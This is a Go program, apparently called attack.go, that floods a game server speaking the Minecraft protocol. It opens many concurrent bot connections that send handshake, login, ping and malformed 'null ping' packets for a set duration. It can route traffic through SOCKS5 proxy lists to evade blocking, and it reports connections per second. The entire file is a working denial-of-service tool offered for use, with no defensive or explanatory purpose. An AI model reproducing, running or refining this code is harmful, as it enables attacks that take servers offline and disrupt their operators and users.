package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

var (
	connectionCount   int32
	failedConnections int32
	maxCPS            int32
	proxies           []string
	sdelay            int = 1000
)

type BotConfig struct {
	ip       string
	port     int
	protocol int
	mode     string
	lock     sync.Mutex
}

func generateRandomName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func writeVarInt(buffer *bytes.Buffer, value int) {
	for {
		if (value & ^0x7F) == 0 {
			buffer.WriteByte(byte(value))
			break
		}
		buffer.WriteByte(byte((value & 0x7F) | 0x80))
		value >>= 7
	}
}

func readVarInt(reader *bufio.Reader) (int, error) {
	var num int
	var shift uint
	for {
		b, err := reader.ReadByte()
		if err != nil {
			return 0, err
		}
		num |= int(b&0x7F) << shift
		if (b & 0x80) == 0 {
			break
		}
		shift += 7
	}
	return num, nil
}

func createHandshakePacket(ip string, port int, protocolVersion int) []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0x00) // Packet ID for handshake
	writeVarInt(&packet, protocolVersion)
	ipData := []byte(ip)
	writeVarInt(&packet, len(ipData))
	packet.Write(ipData)
	packet.Write([]byte{byte(port >> 8), byte(port)})
	packet.Write([]byte{0x02}) // Next state: Login
	packetData := packet.Bytes()
	packetLength := len(packetData)
	var result bytes.Buffer
	writeVarInt(&result, packetLength)
	result.Write(packetData)
	return result.Bytes()
}

func createLoginStartPacket(username string) []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0x00) // Packet ID for login start
	usernameData := []byte(username)
	writeVarInt(&packet, len(usernameData))
	packet.Write(usernameData)

	packetData := packet.Bytes()
	packetLength := len(packetData)
	var result bytes.Buffer
	writeVarInt(&result, packetLength)
	result.Write(packetData)
	return result.Bytes()
}

func createKeepAliveResponse(keepAliveID int) []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0x0B)        // Packet ID for KeepAlive response
	writeVarInt(&packet, keepAliveID) // Write the keepAliveID
	packetData := packet.Bytes()
	packetLength := len(packetData)
	var result bytes.Buffer
	writeVarInt(&result, packetLength) // Prepend the length of the packet
	result.Write(packetData)
	return result.Bytes()
}

func createRequestPacket() []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0xFFF)
	packetID := packet.Bytes()

	lengthBuffer := encodeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createNullPingPacket() []byte {
	packet := new(bytes.Buffer)
	writeVarInt(packet, 0xFFF) // Packet ID for Null Ping (using 0xFFF)
	packetData := packet.Bytes()

	// Encode the length of the packet
	lengthBuffer := encodeVarInt(len(packetData))

	// Append length and packet data
	return append(lengthBuffer, packetData...)
}

func handleKeepAlive(conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		packetLength, err := readVarInt(reader)
		if err != nil {
			return // End connection if reading the packet fails
		}

		packetData := make([]byte, packetLength)
		_, err = io.ReadFull(reader, packetData)
		if err != nil {
			return // End connection if reading packet data fails
		}

		// Read the packet ID from the packet
		packetID, _ := readVarInt(bufio.NewReader(bytes.NewReader(packetData)))

		switch packetID {
		case 0x21:
			keepAliveID, _ := readVarInt(bufio.NewReader(bytes.NewReader(packetData[1:])))
			time.Sleep(1 * time.Second)
			conn.Write(createKeepAliveResponse(keepAliveID))

		case 0x05:
			keepAliveID, _ := readVarInt(bufio.NewReader(bytes.NewReader(packetData[1:])))
			time.Sleep(500 * time.Millisecond)
			conn.Write(createKeepAliveResponse(keepAliveID))

		default:
			// Handle other packet types
		}
	}
}

func encodeVarInt(value int) []byte {
	var buffer bytes.Buffer
	for {
		if (value & ^0x7F) == 0 {
			buffer.WriteByte(byte(value))
			break
		}
		buffer.WriteByte(byte((value & 0x7F) | 0x80))
		value >>= 7
	}
	return buffer.Bytes()
}

func encodeString(value string) []byte {
	stringBytes := []byte(value)
	length := encodeVarInt(len(stringBytes))
	return append(length, stringBytes...)
}

func disconn() []byte {
	id := encodeVarInt(0x00)                  // Assuming 0x00 is the packet ID for disconnect
	reason := encodeString("Connection Lost") // The reason for disconnection
	app := append(id, reason...)              // Combine the packet ID and the reason
	return app
}

func handleConnection(config *BotConfig, proxyAddress string) {
	name := generateRandomName(10) // Generate random bot name

	var conn net.Conn
	var err error

	if proxyAddress != "" {
		proxyParts := strings.Split(proxyAddress, ":")
		proxyIp := proxyParts[0]
		proxyPort := proxyParts[1]

		dialer, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%s", proxyIp, proxyPort), nil, proxy.Direct)
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		conn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	} else {
		conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	}
	defer conn.Close()

	switch config.mode {
	case "join":
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)
		loginStartPacket := createLoginStartPacket(name)

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		if _, err := conn.Write(loginStartPacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		// Start listening for keep-alive packets
		go handleKeepAlive(conn)

	case "handshake":
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	case "bypass":
		time.Sleep(2 * time.Second)
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)
		loginStartPacket := createLoginStartPacket(name)

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		if _, err := conn.Write(loginStartPacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	case "pingjoin":
		actions := []string{"ping", "join"}
		actionIndex, err := RandomInt(len(actions))
		if err != nil {
			return
		}
		action := actions[actionIndex]

		switch action {
		case "ping":
			conn.Write(createHandshakePacket(config.ip, config.port, config.protocol))
			conn.Write(createRequestPacket())

		case "join":
			conn.Write(createHandshakePacket(config.ip, config.port, config.protocol))
			conn.Write(createLoginStartPacket(name)) // Corrected to call createLoginStartPacket
		}

	case "cps": // Moved to be part of the switch statement
		conn.Write([]byte("0x00/0x00/0x00/0x00/0x00"))

	case "ping":
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)
		requestPacket := createRequestPacket()

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		if _, err := conn.Write(requestPacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	case "nullping":
		nullPingPacket := createNullPingPacket()
		if _, err := conn.Write(nullPingPacket); err != nil {
			conn.Write(createHandshakePacket(config.ip, config.port, config.protocol))
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	default:
		atomic.AddInt32(&failedConnections, 1)
		return
	}

	atomic.AddInt32(&connectionCount, 1)
}

func RandomInt(max int) (int, error) {
	if max <= 0 {
		return 0, fmt.Errorf("max must be greater than 0")
	}
	return rand.Intn(max), nil
}

func attackLoop(serverIp string, serverPort int, protocol int, duration int, threadId int, wg *sync.WaitGroup, method string, useProxies bool) {
	defer wg.Done()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		proxyAddress := ""
		if useProxies {
			proxyAddress = proxies[rand.Intn(len(proxies))]
		}

		config := &BotConfig{
			ip:       serverIp,
			port:     serverPort,
			protocol: protocol,
			mode:     method,
		}
		handleConnection(config, proxyAddress)
	}
}

func printConnectionCount(interval float64, duration int, done chan bool) {
	previousCount := int32(0)

	ticker := time.NewTicker(time.Duration(interval*1000) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentCount := atomic.LoadInt32(&connectionCount)
			currentCPS := currentCount - previousCount

			if currentCPS > maxCPS {
				atomic.StoreInt32(&maxCPS, currentCPS)
			}

			fmt.Printf("\rCPS: %d", currentCPS)
			previousCount = currentCount
		case <-done:
			return
		}
	}
}

func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Failed to open proxy file: %v\n", err)
		return nil
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("Failed to read proxy file: %v\n", err)
	}

	return proxies
}

func main() {
	flag.Usage = func() {
		fmt.Printf("Usage: go run attack.go <server_ip:port> <protocol> <duration_seconds> <thread_count> [method] [proxy_file]\n")
		flag.PrintDefaults()
	}
	flag.Parse()

	args := flag.Args()
	if len(args) < 4 || len(args) > 6 {
		flag.Usage()
		return
	}

	serverAddress := strings.Split(args[0], ":")
	if len(serverAddress) != 2 {
		fmt.Println("Invalid format. Use <server_ip:port>")
		return
	}
	serverIp := serverAddress[0]
	serverPort, err := strconv.Atoi(serverAddress[1])
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	protocol, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid protocol: %v\n", err)
		return
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		return
	}
	botCount, err := strconv.Atoi(args[3])
	if err != nil {
		fmt.Printf("Invalid bot count: %v\n", err)
		return
	}

	method := "join"
	if len(args) >= 5 {
		method = args[4]
	}

	useProxies := false
	if len(args) == 6 {
		proxies = loadProxies(args[5])
		if len(proxies) == 0 {
			fmt.Println("Failed to load any proxies.")
			return
		}
		useProxies = true
	}

	var wg sync.WaitGroup
	done := make(chan bool)

	fmt.Println("Attack started")
	go printConnectionCount(1, duration, done)

	for i := 0; i < botCount; i++ {
		wg.Add(1)
		go attackLoop(serverIp, serverPort, protocol, duration, i, &wg, method, useProxies)
	}

	wg.Wait()
	done <- true
	fmt.Printf("\nMax CPS: %d\n", atomic.LoadInt32(&maxCPS))
}
